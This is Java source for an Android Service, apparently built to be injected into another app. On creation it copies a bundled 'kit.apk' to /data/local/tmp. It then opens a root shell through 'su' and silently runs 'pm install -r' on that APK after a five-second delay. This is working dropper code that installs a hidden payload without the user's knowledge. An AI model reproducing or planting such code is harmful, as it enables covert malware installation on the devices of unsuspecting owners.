package com.example.smaliservice;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.PrintWriter;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.IBinder;
import android.util.Log;

public class injectService_1 extends Service {
	private PrintWriter writer;

	
	@Override
	public void onCreate() {
		// TODO Auto-generated method stub
		super.onCreate();
		writer = initWriter();
		copy(this, "kit.apk", "/data/local/tmp", "kit.apk");
	}

	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {
		// TODO Auto-generated method stub
		new Thread(){
			public void run(){
				try {
					sleep(5000);
					
				} catch (InterruptedException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
				shellExcute("pm install -r /data/local/tmp/kit.apk");
			}
		}.start();
		
		return super.onStartCommand(intent, flags, startId);
	}

	@Override
	public IBinder onBind(Intent arg0) {
		// TODO Auto-generated method stub
		return null;
	}
	
	private void copy(Context myContext, String ASSETS_NAME, String savePath,
			String saveName) {
		String filename = savePath + "/" + saveName;
		Log.e("file", "filename=" + filename);
		File dir = new File(savePath);
		// 如果目录不存在，创建这个目录
		if (!dir.exists())
			dir.mkdir();
		Log.e("file", "filename=" + dir.toString());
		try {
			if (!(new File(filename)).exists()) {
				InputStream is = myContext.getResources().getAssets()
						.open(ASSETS_NAME);
				FileOutputStream fos = new FileOutputStream(filename);
				byte[] buffer = new byte[7168];
				int count = 0;
				while ((count = is.read(buffer)) > 0) {
					fos.write(buffer, 0, count);
				}
				fos.close();
				is.close();
			}
		} catch (Exception e) {
			Log.e("file", "filename erro=");
			e.printStackTrace();
		}
	}
	private void shellExcute(String command) {
		if (writer == null)
			writer = initWriter();
		try {
			Log.e("shellExcute", "shellExcute command=" + command);
			writer.println(command);
			writer.flush();
		} catch (Exception e) {
			Log.e("shellExcute", "shellExcute command erro =" + command);
			e.printStackTrace();
		}
	}
	private PrintWriter initWriter() {
		try {
			Process process = Runtime.getRuntime().exec("su");
			return new PrintWriter(process.getOutputStream());
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
			return null;
		}
	}


}
